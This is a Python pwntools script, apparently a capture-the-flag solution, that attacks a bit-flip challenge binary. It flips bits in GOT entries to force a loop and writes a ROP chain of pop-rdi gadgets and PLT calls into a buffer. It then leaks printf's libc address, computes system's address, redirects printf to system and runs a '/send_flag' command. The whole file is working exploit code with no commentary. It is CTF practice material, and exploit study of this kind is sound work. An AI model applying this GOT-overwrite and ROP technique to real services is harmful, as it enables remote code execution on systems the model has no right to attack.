# coding: utf-8
from __future__ import print_function, division
import binascii
from pwn import *
import random

#t socat TCP-L:3001,reuseaddr,fork EXEC:./execfile



is_gaibu = True
host = "problem"
port = 12345
rce = 0x4526a
libc_offset = 0x20740 +  240


r = remote(host, port)

def flip(addr, bit):
    print(r.recvuntil('flip: '))
    r.sendline(hex(addr))
    print(r.recvuntil('flip?'))
    r.sendline(str(bit))

exit_got = 0x601031
dl_got = 0x601010
print("make loop")
flip(exit_got, 0)

bits = 0b100111110111101
cnt = 0
bit = 0

while bits > 0:
    addr = dl_got + cnt
    #print(hex(addr), bit)
    if bits & 1 == 1:
        flip(addr, bit)
    bits >>= 1
    bit += 1
    if bit == 8:
        bit = 0
        cnt += 1

poprdi_ret = 0x00400733
poprsihoge_ret = 0x00400731
plt_puts = 0x4004c0
plt_scanf = 0x4004e0
got_printf = 0x601020
rel_printf = 0x055800
rel_system = 0x045390
plt_printf = 0x4004d0
llu = 0x400869

buf = 0x00601a00

data = [
    (buf + 0x8*1, buf + 0x8*60),
    (buf + 0x8*2, buf + 0x8*60),
    (buf + 0x8* 3, poprdi_ret),
    (buf + 0x8* 4, buf + 0x8*58),
    (buf + 0x8* 5, plt_puts),

    (buf + 0x8* 6, poprdi_ret),
    (buf + 0x8* 7, got_printf + 1),
    (buf + 0x8* 8, plt_puts),

    (buf + 0x8* 9, poprdi_ret),
    (buf + 0x8*10, buf + 0x8*58),
    (buf + 0x8*11, plt_puts),

    (buf + 0x8*12, poprdi_ret),
    (buf + 0x8*13, buf + 0x8*59),
    (buf + 0x8*14, plt_puts),

    (buf + 0x8*15, poprdi_ret),
    (buf + 0x8*16, llu),
    (buf + 0x8*17, poprsihoge_ret),
    (buf + 0x8*18, got_printf),
    (buf + 0x8*19, 0x1234),
    (buf + 0x8*20, plt_scanf),

    (buf + 0x8*21, poprdi_ret),
    (buf + 0x8*22, buf + 0x8*58),
    (buf + 0x8*23, plt_printf),

    (buf + 0x8*24, buf + 0x8*60),
    (buf + 0x8*25, buf + 0x8*60),
    (buf + 0x8*26, buf + 0x8*60),
    (buf + 0x8*27, buf + 0x8*60),
    (buf + 0x8*28, buf + 0x8*60),
    (buf + 0x8*29, buf + 0x8*60),
    (buf + 0x8*30, buf + 0x8*60),
    (buf + 0x8*31, buf + 0x8*60),

    (buf + 0x8*58, 0x6873),
    (buf + 0x8*59, 0x0),
    (buf + 0x8*60, buf + 0x8*60),
]

for (x, y) in data:
    bits = y
    cnt = 0
    bit = 0
    while bits > 0:
        addr = x + cnt
        if bits & 1 == 1:
            flip(addr, bit)
        bits >>= 1
        bit += 1
        if bit == 8:
            bit = 0
            cnt += 1

flip(0, 8)
flip(0, 8)
flip(0, 8)
flip(0x0040072d, buf)
flip(0, 0x0040072c)

print("revert exit")
flip(exit_got, 0)

r.recvuntil("sh\n")
p = "\x00" + r.recvuntil("\n")[:-1]
#print(binascii.hexlify(p))
a_printf = u64(p + "\x00"*(8-len(p)))
#print(hex(a_printf))
libc_base = a_printf - rel_printf
print(hex(libc_base))
a_system = libc_base + rel_system
d = a_system

r.sendline(str(d))

print(r.recv())
r.sendline('/send_flag')

#r.interactive()

